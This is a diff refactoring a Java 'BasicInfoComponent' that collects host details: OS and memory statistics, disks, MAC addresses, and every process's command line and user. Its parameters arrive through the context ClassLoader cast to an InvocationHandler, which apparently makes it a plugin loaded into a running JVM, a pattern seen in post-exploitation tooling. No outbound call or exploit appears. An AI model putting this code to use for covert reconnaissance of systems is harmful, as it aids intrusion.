@@ -7,6 +7,7 @@ import java.lang.management.ManagementFactory;
 import java.lang.management.MemoryUsage;
 import java.lang.management.RuntimeMXBean;
 import java.lang.management.ThreadMXBean;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Method;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
@@ -26,15 +27,6 @@ import java.util.Map;
  */
 public class BasicInfoComponent implements Runnable {
 
-    // 常量定义
-    private static final long BYTES_TO_MB = 1024 * 1024;
-
-    // 时间格式化常量
-    private static final long MILLIS_PER_SECOND = 1000;
-    private static final long MILLIS_PER_MINUTE = 60 * MILLIS_PER_SECOND;
-    private static final long MILLIS_PER_HOUR = 60 * MILLIS_PER_MINUTE;
-    private static final long MILLIS_PER_DAY = 24 * MILLIS_PER_HOUR;
-
     private static final long MIDDLEWARE_CACHE_TTL_MS = 10 * 60 * 1000;
 
     private static volatile String hostName;
@@ -42,22 +34,22 @@ public class BasicInfoComponent implements Runnable {
     private static volatile long middlewareCacheTime;
 
     private ClassLoader currentThreadClassLoader;
+    private Method[] optionalMethods;
 
     // 组件接口字段
     private HashMap<String, Object> params;
     private HashMap<String, Object> results;
 
-    
     public void run() {
         java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
         try {
             Object rawParams = h.invoke(null, null, null);
             params = rawParams instanceof HashMap
                     ? (HashMap<String, Object>) rawParams : new HashMap<String, Object>();
-            results = new java.util.HashMap<String, Object>();
+            results = new HashMap<String, Object>();
             invoke();
         } catch (Throwable t) {
-            if (results == null) results = new java.util.HashMap<String, Object>();
+            if (results == null) results = new HashMap<String, Object>();
             results.put("code", Integer.valueOf(500));
             results.put("msg", t.getMessage());
         }
@@ -65,7 +57,6 @@ public class BasicInfoComponent implements Runnable {
             try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
         }
     }
-
 
     /**
      * 主要执行方法
@@ -171,7 +162,7 @@ public class BasicInfoComponent implements Runnable {
         try {
             java.lang.management.OperatingSystemMXBean stdOs = ManagementFactory.getOperatingSystemMXBean();
             info.put("AvailableProcessors", Integer.valueOf(stdOs.getAvailableProcessors()));
-            info.put("SystemLoadAverage", formatLoadAverage(stdOs.getSystemLoadAverage()));
+            info.put("SystemLoadAverage", Double.valueOf(stdOs.getSystemLoadAverage()));
 
             // 尝试 com.sun.management 扩展方法（反射）
             try {
@@ -180,24 +171,10 @@ public class BasicInfoComponent implements Runnable {
                 long totalPhysical = invokeLongMethod(stdOs, sunOsClass, "getTotalPhysicalMemorySize", -1L);
                 long freePhysical = invokeLongMethod(stdOs, sunOsClass, "getFreePhysicalMemorySize", -1L);
 
-                if (totalPhysical > 0 && freePhysical >= 0) {
-                    long usedPhysical = totalPhysical - freePhysical;
-                    info.put("TotalPhysicalMemoryMB", Long.valueOf(bytesToMB(totalPhysical)));
-                    info.put("FreePhysicalMemoryMB", Long.valueOf(bytesToMB(freePhysical)));
-                    info.put("UsedPhysicalMemoryMB", Long.valueOf(bytesToMB(usedPhysical)));
-                    info.put("PhysicalMemoryUsagePercent", Double.valueOf(calculateUsagePercent(usedPhysical, totalPhysical)));
-                }
-
-                long totalSwap = invokeLongMethod(stdOs, sunOsClass, "getTotalSwapSpaceSize", -1L);
-                long freeSwap = invokeLongMethod(stdOs, sunOsClass, "getFreeSwapSpaceSize", -1L);
-
-                if (totalSwap > 0 && freeSwap >= 0) {
-                    long usedSwap = totalSwap - freeSwap;
-                    info.put("TotalSwapSpaceMB", Long.valueOf(bytesToMB(totalSwap)));
-                    info.put("FreeSwapSpaceMB", Long.valueOf(bytesToMB(freeSwap)));
-                    info.put("UsedSwapSpaceMB", Long.valueOf(bytesToMB(usedSwap)));
-                    info.put("SwapUsagePercent", Double.valueOf(calculateUsagePercent(usedSwap, totalSwap)));
-                }
+                info.put("TotalPhysicalMemoryBytes", Long.valueOf(totalPhysical));
+                info.put("FreePhysicalMemoryBytes", Long.valueOf(freePhysical));
+                info.put("TotalSwapSpaceBytes", Long.valueOf(invokeLongMethod(stdOs, sunOsClass, "getTotalSwapSpaceSize", -1L)));
+                info.put("FreeSwapSpaceBytes", Long.valueOf(invokeLongMethod(stdOs, sunOsClass, "getFreeSwapSpaceSize", -1L)));
             } catch (ClassNotFoundException ignored) {
                 info.put("note", "com.sun.management not available, physical memory info unavailable");
             }
@@ -222,7 +199,7 @@ public class BasicInfoComponent implements Runnable {
             info.put("OSVersion", stdOs.getVersion());
             info.put("OSArch", stdOs.getArch());
             info.put("HostName", host);
-            info.put("SystemUptime", formatUptime(runtime.getUptime()));
+            info.put("UptimeMs", Long.valueOf(runtime.getUptime()));
             info.put("StartTime", Long.valueOf(runtime.getStartTime()));
 
         } catch (Exception e) {
@@ -327,24 +304,12 @@ public class BasicInfoComponent implements Runnable {
             }
 
             // JVM 内存信息
-            long totalMemory = runtimeInstance.totalMemory();
-            long freeMemory = runtimeInstance.freeMemory();
-            long maxMemory = runtimeInstance.maxMemory();
-            long usedMemory = totalMemory - freeMemory;
-
-            javaInfo.put("TotalMemoryMB", Long.valueOf(bytesToMB(totalMemory)));
-            javaInfo.put("FreeMemoryMB", Long.valueOf(bytesToMB(freeMemory)));
-            javaInfo.put("UsedMemoryMB", Long.valueOf(bytesToMB(usedMemory)));
-            javaInfo.put("MaxMemoryMB", Long.valueOf(bytesToMB(maxMemory)));
-            javaInfo.put("MemoryUsagePercent", Double.valueOf(calculateUsagePercent(usedMemory, totalMemory)));
-
-            // 堆内存信息
+            javaInfo.put("TotalMemoryBytes", Long.valueOf(runtimeInstance.totalMemory()));
+            javaInfo.put("FreeMemoryBytes", Long.valueOf(runtimeInstance.freeMemory()));
+            javaInfo.put("MaxMemoryBytes", Long.valueOf(runtimeInstance.maxMemory()));
             MemoryUsage heap = ManagementFactory.getMemoryMXBean().getHeapMemoryUsage();
-            long heapUsed = heap.getUsed();
-            long heapMax = heap.getMax();
-            javaInfo.put("HeapUsedMB", Long.valueOf(bytesToMB(heapUsed)));
-            javaInfo.put("HeapMaxMB", Long.valueOf(bytesToMB(heapMax)));
-            javaInfo.put("HeapUsagePercent", Double.valueOf(calculateUsagePercent(heapUsed, heapMax)));
+            javaInfo.put("HeapUsedBytes", Long.valueOf(heap.getUsed()));
+            javaInfo.put("HeapMaxBytes", Long.valueOf(heap.getMax()));
 
             // 线程信息
             ThreadMXBean thread = ManagementFactory.getThreadMXBean();
@@ -386,18 +351,18 @@ public class BasicInfoComponent implements Runnable {
             Object iterable = fileSystemClass.getMethod("getFileStores").invoke(fileSystem);
             Iterator<?> iterator = ((Iterable<?>) iterable).iterator();
             Class<?> fileStoreClass = Class.forName("java.nio.file.FileStore");
+            Method name = fileStoreClass.getMethod("name");
+            Method type = fileStoreClass.getMethod("type");
+            Method totalSpace = fileStoreClass.getMethod("getTotalSpace");
+            Method usableSpace = fileStoreClass.getMethod("getUsableSpace");
             while (iterator.hasNext() && stores.size() < 256) {
                 Object store = iterator.next();
                 Map<String, Object> info = new HashMap<String, Object>();
-                String storeText = String.valueOf(store);
-                String mount = fileStoreMount(storeText);
-                String name = String.valueOf(fileStoreClass.getMethod("name").invoke(store));
-                String fsType = String.valueOf(fileStoreClass.getMethod("type").invoke(store));
-                info.put("mount", mount);
-                info.put("name", name);
-                info.put("fsType", fsType);
-                long total = ((Number) fileStoreClass.getMethod("getTotalSpace").invoke(store)).longValue();
-                long free = ((Number) fileStoreClass.getMethod("getUsableSpace").invoke(store)).longValue();
+                info.put("mount", fileStoreMount(String.valueOf(store)));
+                info.put("name", String.valueOf(name.invoke(store)));
+                info.put("fsType", String.valueOf(type.invoke(store)));
+                long total = ((Number) totalSpace.invoke(store)).longValue();
+                long free = ((Number) usableSpace.invoke(store)).longValue();
                 addSpaceInfo(info, total, free);
                 stores.add(info);
             }
@@ -488,7 +453,7 @@ public class BasicInfoComponent implements Runnable {
             processInfo.put("ProcessId", getProcessId());
             processInfo.put("ProcessName", System.getProperty("sun.java.command"));
             processInfo.put("StartTime", Long.valueOf(runtime.getStartTime()));
-            processInfo.put("Uptime", formatUptime(runtime.getUptime()));
+            processInfo.put("UptimeMs", Long.valueOf(runtime.getUptime()));
         } catch (Exception e) {
             processInfo.put("error", "failed to get process info: " + e.getMessage());
         }
@@ -513,38 +478,49 @@ public class BasicInfoComponent implements Runnable {
     private List<Map<String, Object>> getProcessHandleProcesses() {
         List<Map<String, Object>> processes = new ArrayList<Map<String, Object>>();
         Object stream = null;
+        Method closeStream = null;
         try {
             Class<?> handleClass = Class.forName("java.lang.ProcessHandle");
             Class<?> infoClass = Class.forName("java.lang.ProcessHandle$Info");
             Class<?> baseStreamClass = Class.forName("java.util.stream.BaseStream");
+            closeStream = baseStreamClass.getMethod("close");
+            Method pid = handleClass.getMethod("pid");
+            Method alive = handleClass.getMethod("isAlive");
+            Method parentHandle = handleClass.getMethod("parent");
+            Method handleInfo = handleClass.getMethod("info");
+            Method commandLine = infoClass.getMethod("commandLine");
+            Method commandPath = infoClass.getMethod("command");
+            Method user = infoClass.getMethod("user");
+            Method startInstant = infoClass.getMethod("startInstant");
+            Method cpuDuration = infoClass.getMethod("totalCpuDuration");
+            Method epochMilli = Class.forName("java.time.Instant").getMethod("toEpochMilli");
+            Method millis = Class.forName("java.time.Duration").getMethod("toMillis");
             stream = handleClass.getMethod("allProcesses").invoke(null);
             Iterator<?> iterator = (Iterator<?>) baseStreamClass.getMethod("iterator").invoke(stream);
             while (iterator.hasNext() && processes.size() < 2000) {
                 Object handle = iterator.next();
                 Map<String, Object> process = new HashMap<String, Object>();
-                process.put("pid", handleClass.getMethod("pid").invoke(handle));
-                process.put("alive", handleClass.getMethod("isAlive").invoke(handle));
-                Object parent = optionalValue(handleClass.getMethod("parent").invoke(handle));
-                if (parent != null) process.put("ppid", handleClass.getMethod("pid").invoke(parent));
-                Object info = handleClass.getMethod("info").invoke(handle);
-                putOptional(process, "cmd", infoClass.getMethod("commandLine").invoke(info));
-                putOptional(process, "command", infoClass.getMethod("command").invoke(info));
-                putOptional(process, "user", infoClass.getMethod("user").invoke(info));
+                process.put("pid", pid.invoke(handle));
+                process.put("alive", alive.invoke(handle));
+                Object parent = optionalValue(parentHandle.invoke(handle));
+                if (parent != null) process.put("ppid", pid.invoke(parent));
+                Object info = handleInfo.invoke(handle);
+                putOptional(process, "cmd", commandLine.invoke(info));
+                putOptional(process, "command", commandPath.invoke(info));
+                putOptional(process, "user", user.invoke(info));
                 Object command = process.get("command");
                 process.put("name", command == null ? "" : new File(String.valueOf(command)).getName());
-                Object start = optionalValue(infoClass.getMethod("startInstant").invoke(info));
-                if (start != null) {
-                    process.put("startTime", start.getClass().getMethod("toEpochMilli").invoke(start));
-                }
-                Object cpu = optionalValue(infoClass.getMethod("totalCpuDuration").invoke(info));
-                if (cpu != null) process.put("cpuMillis", cpu.getClass().getMethod("toMillis").invoke(cpu));
+                Object start = optionalValue(startInstant.invoke(info));
+                if (start != null) process.put("startTime", epochMilli.invoke(start));
+                Object cpu = optionalValue(cpuDuration.invoke(info));
+                if (cpu != null) process.put("cpuMillis", millis.invoke(cpu));
                 processes.add(process);
             }
         } catch (Throwable ignored) {
             processes.clear();
         } finally {
             if (stream != null) {
-                try { Class.forName("java.util.stream.BaseStream").getMethod("close").invoke(stream); }
+                try { closeStream.invoke(stream); }
                 catch (Throwable ignored) {}
             }
         }
@@ -572,8 +548,12 @@ public class BasicInfoComponent implements Runnable {
 
     private Object optionalValue(Object optional) throws Exception {
         if (optional == null) return null;
-        Boolean present = (Boolean) optional.getClass().getMethod("isPresent").invoke(optional);
-        return present.booleanValue() ? optional.getClass().getMethod("get").invoke(optional) : null;
+        if (optionalMethods == null) {
+            Class<?> type = optional.getClass();
+            optionalMethods = new Method[]{type.getMethod("isPresent"), type.getMethod("get")};
+        }
+        Boolean present = (Boolean) optionalMethods[0].invoke(optional);
+        return present.booleanValue() ? optionalMethods[1].invoke(optional) : null;
     }
 
     /** Windows 可用 jna-platform 时走 EnumProcesses；其他环境自然落到 /proc。 */
@@ -584,27 +564,29 @@ public class BasicInfoComponent implements Runnable {
             Class<?> psapiClass = Class.forName("com.sun.jna.platform.win32.Psapi");
             Class<?> kernelClass = Class.forName("com.sun.jna.platform.win32.Kernel32");
             Class<?> intRefClass = Class.forName("com.sun.jna.ptr.IntByReference");
+            Method getValue = intRefClass.getMethod("getValue");
+            Constructor<?> lengthConstructor = intRefClass.getConstructor(int.class);
             Object psapi = psapiClass.getField("INSTANCE").get(null);
             Object kernel = kernelClass.getField("INSTANCE").get(null);
             int[] pids = new int[4096];
             Object needed = intRefClass.newInstance();
             Method enumProcesses = findMethod(psapiClass, "EnumProcesses", 3);
             enumProcesses.invoke(psapi, pids, Integer.valueOf(pids.length * 4), needed);
-            int count = ((Number) intRefClass.getMethod("getValue").invoke(needed)).intValue() / 4;
+            int count = ((Number) getValue.invoke(needed)).intValue() / 4;
             Method openProcess = findMethod(kernelClass, "OpenProcess", 3);
             Method queryImage = findMethod(kernelClass, "QueryFullProcessImageName", 4);
             Method closeHandle = findMethod(kernelClass, "CloseHandle", 1);
+            char[] path = new char[32768];
             for (int i = 0; i < count && processes.size() < 2000; i++) {
                 if (pids[i] <= 0) continue;
                 Object handle = openProcess.invoke(kernel, Integer.valueOf(0x1000), Boolean.FALSE,
                         Integer.valueOf(pids[i]));
                 if (handle == null) continue;
                 try {
-                    char[] path = new char[32768];
-                    Object length = intRefClass.getConstructor(int.class).newInstance(Integer.valueOf(path.length));
+                    Object length = lengthConstructor.newInstance(Integer.valueOf(path.length));
                     Boolean ok = (Boolean) queryImage.invoke(kernel, handle, Integer.valueOf(0), path, length);
                     if (!ok.booleanValue()) continue;
-                    int pathLength = ((Number) intRefClass.getMethod("getValue").invoke(length)).intValue();
+                    int pathLength = ((Number) getValue.invoke(length)).intValue();
                     String command = new String(path, 0, pathLength);
                     Map<String, Object> process = new HashMap<String, Object>();
                     process.put("pid", Integer.valueOf(pids[i]));
@@ -658,7 +640,6 @@ public class BasicInfoComponent implements Runnable {
             processes.add(process);
         }
         return processes;
-
     }
 
     private boolean isDigits(String value) {
@@ -741,88 +722,29 @@ public class BasicInfoComponent implements Runnable {
                 return hostName;
             }
 
-            String name = System.getenv("HOSTNAME");        // Linux
-            if (name != null && name.length() > 0) {
-                hostName = name;
-                return hostName;
+            String name = System.getenv("HOSTNAME");
+            if (name == null || name.length() == 0) name = System.getenv("COMPUTERNAME");
+            if (name == null || name.length() == 0) {
+                try { name = InetAddress.getLocalHost().getHostName(); }
+                catch (Exception ignored) { name = "unknown"; }
             }
-            name = System.getenv("COMPUTERNAME");            // Windows
-            if (name != null && name.length() > 0) {
-                hostName = name;
-                return hostName;
-            }
-
-            try {
-                hostName = InetAddress.getLocalHost().getHostName();
-            } catch (Exception e) {
-                hostName = "unknown";
-            }
+            hostName = name;
         }
         return hostName;
-    }
-
-    private long bytesToMB(long bytes) {
-        return bytes / BYTES_TO_MB;
-    }
-
-    private double calculateUsagePercent(long used, long total) {
-        if (total <= 0) {
-            return 0.0;
-        }
-        return Math.round((double) used / total * 1000) / 10.0;
     }
 
     /**
      * 格式化 MAC 地址
      */
     private String formatMacAddress(byte[] mac) {
-        StringBuilder sb = new StringBuilder();
+        StringBuilder sb = new StringBuilder(mac.length * 3);
+        String hex = "0123456789ABCDEF";
         for (int i = 0; i < mac.length; i++) {
-            if (i > 0) {
-                sb.append(':');
-            }
-            sb.append(hexByte(mac[i]));
+            if (i > 0) sb.append(':');
+            int value = mac[i] & 0xFF;
+            sb.append(hex.charAt(value >>> 4)).append(hex.charAt(value & 0x0F));
         }
         return sb.toString();
-    }
-
-    /**
-     * 单字节转两位十六进制（避免 String.format 开销）
-     */
-    private String hexByte(byte b) {
-        int v = b & 0xFF;
-        char hi = "0123456789ABCDEF".charAt(v >>> 4);
-        char lo = "0123456789ABCDEF".charAt(v & 0x0F);
-        return new String(new char[]{hi, lo});
-    }
-
-    private String formatLoadAverage(double load) {
-        if (load < 0) {
-            return "N/A";
-        }
-        return String.format("%.2f", Double.valueOf(load));
-    }
-
-    /**
-     * 格式化运行时间为 "Xd HH:MM:SS"。
-     */
-    private String formatUptime(long uptime) {
-        long days = uptime / MILLIS_PER_DAY;
-        long hours = (uptime % MILLIS_PER_DAY) / MILLIS_PER_HOUR;
-        long minutes = (uptime % MILLIS_PER_HOUR) / MILLIS_PER_MINUTE;
-        long seconds = (uptime % MILLIS_PER_MINUTE) / MILLIS_PER_SECOND;
-
-        return days + "d " + pad2(hours) + ":" + pad2(minutes) + ":" + pad2(seconds);
-    }
-
-    /**
-     * 两位补零（避免 String.format）
-     */
-    private String pad2(long val) {
-        if (val < 10) {
-            return "0" + val;
-        }
-        return String.valueOf(val);
     }
 
     private String getProcessId() {
@@ -862,19 +784,12 @@ public class BasicInfoComponent implements Runnable {
     }
 
     private String detectWebFramework() {
-        if (exists("org.springframework.boot.SpringApplication")
-                && exists("org.springframework.web.reactive.DispatcherHandler")) {
-            return "Spring Boot (WebFlux)";
-        }
-        if (exists("org.springframework.boot.SpringApplication")
-                && exists("org.springframework.web.servlet.DispatcherServlet")) {
-            return "Spring Boot (MVC)";
-        }
+        boolean springBoot = exists("org.springframework.boot.SpringApplication");
         if (exists("org.springframework.web.reactive.DispatcherHandler")) {
-            return "WebFlux";
+            return springBoot ? "Spring Boot (WebFlux)" : "WebFlux";
         }
         if (exists("org.springframework.web.servlet.DispatcherServlet")) {
-            return "Spring MVC";
+            return springBoot ? "Spring Boot (MVC)" : "Spring MVC";
         }
         if (exists("org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter")) {
             return "Struts2";
